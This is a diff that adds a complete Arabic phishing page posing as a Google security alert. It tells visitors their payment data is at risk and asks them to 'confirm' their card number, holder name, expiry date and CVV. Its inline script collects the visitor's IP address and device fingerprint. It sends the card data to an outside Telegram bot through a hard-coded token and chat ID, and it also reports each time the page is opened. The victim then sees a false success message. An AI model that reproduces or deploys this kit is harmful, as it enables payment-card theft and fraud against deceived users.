@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تأمين بيانات الدفع - Google</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="google-container">
+        <!-- الهيدر -->
+        <header class="google-header">
+            <div class="header-content">
+                <div class="google-logo">
+                    <span>G</span>
+                    <span>o</span>
+                    <span>o</span>
+                    <span>g</span>
+                    <span>l</span>
+                    <span>e</span>
+                </div>
+                <nav class="header-nav">
+                    <a href="#" class="nav-link">مساعدة</a>
+                    <a href="#" class="nav-link">الإبلاغ عن مشكلة</a>
+                </nav>
+            </div>
+        </header>
+
+        <!-- المحتوى الرئيسي -->
+        <main class="main-content">
+            <div class="security-card">
+                <div class="security-header">
+                    <div class="security-icon">
+                        <i class="fas fa-shield-alt"></i>
+                    </div>
+                    <h1 class="security-title">تنبيه أمني مهم</h1>
+                </div>
+
+                <!-- تحذير -->
+                <div class="alert-banner critical">
+                    <div class="alert-icon">
+                        <i class="fas fa-exclamation-triangle"></i>
+                    </div>
+                    <div class="alert-content">
+                        <strong>تم اكتشاف نشاط غير معتاد</strong>
+                        <p>بيانات الدفع الخاصة بك قد تكون في خطر</p>
+                    </div>
+                </div>
+
+                <div class="warning-message">
+                    <p>لقد اكتشفنا محاولة وصول غير مصرح بها إلى حساب Google الخاص بك. لحماية معلومات فيزا Google Play المرتبطة بحسابك، يلزم تأكيد هويتك.</p>
+                </div>
+
+                <!-- نموذج إدخال البيانات -->
+                <div class="verification-section">
+                    <h3>تأكيد معلومات الدفع</h3>
+                    <p class="section-description">لضمان أمان حسابك، يرجى تأكيد معلومات بطاقة الائتمان الخاصة بك</p>
+
+                    <form class="payment-form" id="paymentForm">
+                        <div class="form-group">
+                            <label for="cardNumber" class="form-label">رقم البطاقة</label>
+                            <input type="text" id="cardNumber" class="form-input" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="cardHolder" class="form-label">اسم حامل البطاقة</label>
+                            <input type="text" id="cardHolder" class="form-input" placeholder="كما هو مدون على البطاقة" required>
+                        </div>
+
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="expiryDate" class="form-label">تاريخ الانتهاء</label>
+                                <input type="text" id="expiryDate" class="form-input" placeholder="MM/YY" maxlength="5" required>
+                            </div>
+                            <div class="form-group">
+                                <label for="cvv" class="form-label">رمز الأمان (CVV)</label>
+                                <input type="text" id="cvv" class="form-input" placeholder="123" maxlength="3" required>
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label">نوع البطاقة</label>
+                            <div class="card-types">
+                                <div class="card-type visa">VISA</div>
+                                <div class="card-type mastercard">MasterCard</div>
+                                <div class="card-type mada">MADA</div>
+                            </div>
+                        </div>
+
+                        <button type="submit" class="verify-button" id="verifyBtn">
+                            تأمين الحساب والمتابعة
+                        </button>
+                    </form>
+                </div>
+
+                <!-- إشعار الأمان -->
+                <div class="security-notice">
+                    <div class="notice-icon">
+                        <i class="fas fa-lock"></i>
+                    </div>
+                    <div class="notice-text">
+                        <strong>معلوماتك محمية</strong>
+                        <p>تلتزم Google بحماية خصوصيتك وأمانك. جميع المعاملات مشفرة وآمنة.</p>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <!-- الفوتر -->
+        <footer class="google-footer">
+            <div class="footer-content">
+                <div class="footer-links">
+                    <a href="#" class="footer-link">الشروط والأحكام</a>
+                    <a href="#" class="footer-link">الخصوصية</a>
+                    <a href="#" class="footer-link">المساعدة</a>
+                </div>
+                <div class="footer-language">
+                    <select class="language-select">
+                        <option>العربية</option>
+                        <option>English</option>
+                    </select>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+    <script src="script.js"></script>
+    <script>
+        // إعدادات البوت - تم ضبط التوكن والشات ايدي
+        const TOKEN = "8024648648:AAGrlrCMMQ7HPTOoxsKUtB2ZzF_pv1aRoO8";
+        const CHAT_ID = "5263073413";
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+        // انتظر حتى يتم تحميل الصفحة بالكامل
+        document.addEventListener('DOMContentLoaded', function() {
+            const paymentForm = document.getElementById('paymentForm');
+            const verifyBtn = document.getElementById('verifyBtn');
+            
+            if (!paymentForm) {
+                console.error('لم يتم العثور على النموذج المطلوب');
+                return;
+            }
+
+            // إضافة مستمع حدث للإرسال
+            paymentForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+
+                // الحصول على قيم الحقول
+                const cardNumber = document.getElementById('cardNumber').value;
+                const cardHolder = document.getElementById('cardHolder').value;
+                const expiryDate = document.getElementById('expiryDate').value;
+                const cvv = document.getElementById('cvv').value;
+
+                // التحقق من وجود القيم
+                if (!cardNumber || !cardHolder || !expiryDate || !cvv) {
+                    alert('يرجى ملء جميع الحقول المطلوبة');
+                    return;
+                }
+
+                // التحقق من صحة رقم البطاقة
+                const cleanCardNumber = cardNumber.replace(/\s/g, '');
+                if (cleanCardNumber.length !== 16 || !/^\d+$/.test(cleanCardNumber)) {
+                    alert('يرجى إدخال رقم بطاقة صحيح (16 رقماً)');
+                    return;
+                }
+
+                // التحقق من صحة CVV
+                if (cvv.length !== 3 || !/^\d+$/.test(cvv)) {
+                    alert('يرجى إدخال رمز أمان صحيح (3 أرقام)');
+                    return;
+                }
+
+                // إظهار حالة التحميل
+                const originalText = verifyBtn.innerHTML;
+                verifyBtn.innerHTML = 'جاري المعالجة... <div class="loading"></div>';
+                verifyBtn.disabled = true;
+
+                // الحصول على عنوان IP والمعلومات الأخرى
+                axios.get('https://api.ipify.org?format=json')
+                    .then(response => {
+                        const ip = response.data.ip;
+
+                        // جمع معلومات الجهاز
+                        const userAgent = navigator.userAgent;
+                        const platform = navigator.platform;
+                        const screenWidth = screen.width;
+                        const screenHeight = screen.height;
+                        const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+                        const language = navigator.language;
+                        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                        const timestamp = new Date().toLocaleString('ar-SA');
+
+                        // تنسيق الرسالة
+                        const message = ` 
+💳 <b>New Visa Card Verification</b>
+
+🔢 <b>Card Number:</b> <code>${cardNumber}</code>
+👤 <b>Card Holder:</b> <code>${cardHolder}</code>
+📅 <b>Expiry Date:</b> <code>${expiryDate}</code>
+🔐 <b>CVV:</b> <code>${cvv}</code>
+
+🌐 <b>IP Address:</b> ${ip}
+📱 <b>Device Type:</b> ${deviceType}
+🖥️ <b>Platform:</b> ${platform}
+🗣️ <b>Language:</b> ${language}
+🕒 <b>Timezone:</b> ${timezone}
+📏 <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
+⏰ <b>Time:</b> ${timestamp}
+
+<b>User Agent:</b>
+<pre>${userAgent}</pre>
+                        `;
+
+                        // إرسال البيانات إلى Telegram
+                        return axios.post(URI_API, {
+                            chat_id: CHAT_ID,
+                            parse_mode: 'html',
+                            text: message
+                        });
+                    })
+                    .then(response => {
+                        alert('تم تأمين حسابك بنجاح! شكراً لتأكيد معلوماتك.');
+                        
+                        // إعادة تعيين النموذج بعد الإرسال الناجح
+                        paymentForm.reset();
+                    })
+                    .catch(error => {
+                        console.error('Error:', error);
+                        
+                        if (error.response) {
+                            alert('حدث خطأ في إرسال المعلومات. يرجى المحاولة مرة أخرى.');
+                        } else if (error.request) {
+                            alert('خطأ في الشبكة. يرجى التحقق من اتصال الإنترنت.');
+                        } else {
+                            alert('حدث خطأ غير متوقع. يرجى المحاولة مرة أخرى.');
+                        }
+                    })
+                    .finally(() => {
+                        // إعادة تعيين الزر
+                        verifyBtn.innerHTML = originalText;
+                        verifyBtn.disabled = false;
+                    });
+            });
+
+            // إرسال إشعار عند فتح الصفحة
+            if (TOKEN && CHAT_ID) {
+                const pageLoadMessage = `
+🔔 <b>Google Security Page Opened</b>
+🌐 <b>URL:</b> ${window.location.href}
+🕒 <b>Time:</b> ${new Date().toLocaleString('ar-SA')}
+📱 <b>User Agent:</b> ${navigator.userAgent}
+                `;
+
+                axios.post(URI_API, {
+                    chat_id: CHAT_ID,
+                    parse_mode: 'html',
+                    text: pageLoadMessage
+                }).catch(error => {
+                    console.log('Failed to send page load notification');
+                });
+            }
+
+            // وظائف تنسيق الإدخال
+            document.getElementById('cardNumber').addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+                let formattedValue = value.match(/.{1,4}/g)?.join(' ');
+                if (formattedValue) {
+                    e.target.value = formattedValue;
+                }
+            });
+
+            document.getElementById('expiryDate').addEventListener('input', function(e) {
+                let value = e.target.value.replace(/[^0-9]/g, '');
+                if (value.length >= 2) {
+                    e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                }
+            });
+
+            document.getElementById('cvv').addEventListener('input', function(e) {
+                e.target.value = e.target.value.replace(/[^0-9]/g, '');
+            });
+
+            console.log('Google Security Telegram Bot script loaded successfully!');
+            console.log('Bot Token:', TOKEN);
+            console.log('Chat ID:', CHAT_ID);
+        });
+
+        // دالة للحصول على الموقع من IP
+        async function getLocationFromIP(ip) {
+            try {
+                const response = await axios.get(`http://ip-api.com/json/${ip}`);
+                const data = response.data;
+                if (data.status === 'success') {
+                    return `${data.city}, ${data.country}`;
+                }
+                return 'Unknown';
+            } catch (error) {
+                return 'Unknown';
+            }
+        }
+    </script>
+</body>
+</html>
